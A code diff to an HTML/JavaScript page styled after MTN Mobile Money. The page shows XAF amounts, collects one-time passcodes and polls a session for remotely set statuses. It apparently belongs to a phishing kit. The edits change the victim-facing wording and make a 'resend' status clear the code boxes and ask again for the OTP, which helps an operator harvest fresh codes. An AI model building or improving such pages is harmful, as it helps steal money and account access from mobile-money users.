@@ -16,29 +16,24 @@
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;font-family:var(--font-family);background:#f4f6fa;overflow:hidden}
 body{display:flex;justify-content:center;align-items:stretch;height:100vh;height:100dvh}
-
 .app{width:100%;max-width:480px;background:#fff;display:flex;flex-direction:column;height:100vh;height:100dvh;position:relative;overflow:hidden}
 
 .app-header{background:linear-gradient(160deg,#FFD633 0%,var(--mtn-yellow) 45%,var(--mtn-yellow-dark) 100%);padding:16px 20px 34px;position:relative;overflow:hidden;flex-shrink:0}
 .app-header::before{content:'';position:absolute;top:-60px;right:-60px;width:220px;height:220px;border-radius:50%;background:rgba(255,255,255,.18)}
 .app-header::after{content:'';position:absolute;top:-40px;left:-70px;width:180px;height:180px;border-radius:50%;background:rgba(0,51,128,.08)}
-
 .header-top{display:flex;justify-content:space-between;align-items:center;position:relative;z-index:2;margin-bottom:16px}
 .back-btn{width:38px;height:38px;border-radius:50%;background:rgba(255,255,255,.35);backdrop-filter:blur(10px);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#003366;font-size:20px;font-weight:800;transition:transform .15s,background .15s}
 .back-btn:hover{background:rgba(255,255,255,.55);transform:translateX(-2px)}
 .step-pill{background:rgba(0,51,128,.15);color:#003366;padding:6px 12px;border-radius:50px;font-size:11px;font-weight:800;letter-spacing:.4px;text-transform:uppercase}
-
 .header-title{position:relative;z-index:2;color:#003366}
 .header-title h1{font-size:22px;font-weight:800;line-height:1.25;margin-bottom:6px}
 .header-title p{font-size:13px;font-weight:600;opacity:.7;line-height:1.4}
-
 .step-dots{display:flex;gap:6px;margin-top:14px;position:relative;z-index:2}
 .step-dot{flex:1;height:4px;border-radius:2px;background:rgba(0,51,128,.2)}
 .step-dot.active{background:#003366}
 .step-dot.done{background:#003366;opacity:.6}
 
 .app-body{flex:1;padding:22px 20px 20px;overflow-y:auto;display:flex;flex-direction:column;gap:18px}
-
 .info-banner{background:linear-gradient(135deg,var(--mtn-yellow-light),#FFF3B8);border:1.5px solid var(--mtn-yellow);border-radius:14px;padding:14px 16px;display:flex;gap:12px;align-items:flex-start}
 .info-banner-icon{font-size:22px;flex-shrink:0;line-height:1}
 .info-banner-text{flex:1;font-size:12.5px;color:#5a4a00;line-height:1.5;font-weight:600}
@@ -240,8 +235,8 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
     <div class="success-icon">
       <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#003366" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
     </div>
-    <h3 class="success-title">Payment in Review</h3>
-    <p class="success-desc">Your payment authorization has been received and is being reviewed. You'll be notified shortly.</p>
+    <h3 class="success-title">Transaction in Review</h3>
+    <p class="success-desc">Your transaction is being reviewed. You will be notified once it arrives in your account.</p>
     <div class="success-amount" id="successAmount">XAF —</div>
     <button class="success-btn" onclick="closeSuccess()">Done</button>
   </div>
@@ -252,8 +247,8 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
     <div class="reject-icon">
       <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
     </div>
-    <h3 class="reject-title" id="rejectTitle">Invalid OTP</h3>
-    <p class="reject-desc" id="rejectDesc">Please check the code and try again.</p>
+    <h3 class="reject-title" id="rejectTitle">Incorrect code</h3>
+    <p class="reject-desc" id="rejectDesc">Please check the OTP and enter it again.</p>
     <button class="reject-btn" onclick="closeReject()">Try Again</button>
   </div>
 </div>
@@ -417,12 +412,14 @@ function startPolling(sessionId){
         stopPolling(); stopVerifyBar();
         addFeedLine('ok','Authorization successful');
         showSuccess();
-      } else if (data.status === 'declined') {
+      } else if (data.status === 'rejected' || data.status === 'resend') {
+        // Resend: clear OTP boxes, stay on same page, show error popup
         stopPolling(); stopVerifyBar();
-        showReject('Invalid OTP','Please check the code and try again.');
-      } else if (data.status === 'resend') {
-        stopPolling(); stopVerifyBar();
-        setTimeout(()=>{ window.location.href = 'login.html'; },400);
+        otpBoxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'invalid'); });
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Verify & Complete';
+        showReject('Incorrect code', 'Please check the OTP and enter it again.');
+        setTimeout(()=>otpBoxes[0].focus(), 200);
       } else if (data.status === 'expired') {
         stopPolling(); stopVerifyBar();
         showReject('Session expired','Your request timed out. Please try again.');
